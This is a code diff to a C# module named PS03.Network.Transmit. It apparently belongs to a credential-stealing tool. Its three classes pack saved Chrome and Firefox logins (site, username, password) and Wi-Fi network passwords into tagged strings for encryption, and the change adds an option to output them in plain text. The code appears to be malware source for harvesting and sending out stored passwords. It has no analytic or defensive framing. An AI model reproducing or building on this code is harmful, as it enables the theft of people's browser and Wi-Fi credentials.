@@ -16,9 +16,9 @@ namespace PS03.Network.Transmit
 
     public class ChromePacker : Packer
     {
-        public string Pack(CPProfile profile)
+        public string Pack(CPProfile profile, bool encrypt)
         {
-            string toencrypt = "FIREFOX:";
+            var toencrypt = "FIREFOX:";
             if (!string.IsNullOrWhiteSpace(profile.ActionURL))
                 toencrypt += ("ACTION=" + profile.ActionURL);
             else toencrypt += ("ACTION=EMPTY");
@@ -31,15 +31,17 @@ namespace PS03.Network.Transmit
                 toencrypt += ("PASS=" + profile.Password);
             else toencrypt += "PASS=EMPTY";
 
-            return Encrypt(toencrypt);
+            if (encrypt)
+                return Encrypt(toencrypt);
+            return toencrypt;
         }
     }
 
     public class FirefoxPakcer : Packer
     {
-        public string Pack(FFData profile)
+        public string Pack(FFData profile, bool encrypt)
         {
-            string toencrypt = "CHROME:";
+            var toencrypt = "CHROME:";
             if (!string.IsNullOrWhiteSpace(profile.Host))
                 toencrypt += ("ACTION=" + profile.Host);
             else toencrypt += ("ACTION=EMPTY");
@@ -52,15 +54,17 @@ namespace PS03.Network.Transmit
                 toencrypt += ("PASS=" + profile.Password);
             else toencrypt += "PASS=EMPTY";
 
-            return Encrypt(toencrypt);
+            if (encrypt)
+                return Encrypt(toencrypt);
+            return toencrypt;
         }
     }
 
     public class WifiPacker : Packer
     {
-        public string Pack(Profile profile)
+        public string Pack(Profile profile, bool encrypt)
         {
-            string toencrypt = "WIFI:";
+            var toencrypt = "WIFI:";
             if (!string.IsNullOrWhiteSpace(profile.SSID))
                 toencrypt += ("SSID=" + profile.SSID);
             else toencrypt += "SSID=EMPTY";
@@ -70,8 +74,7 @@ namespace PS03.Network.Transmit
             if (!string.IsNullOrWhiteSpace(profile.Password))
                 toencrypt += ("PASS=" + profile.Password);
             else toencrypt += "PASS=EMPTY";
-            return Encrypt(toencrypt);
-
+            return encrypt ? Encrypt(toencrypt) : toencrypt;
         }
     }
 }
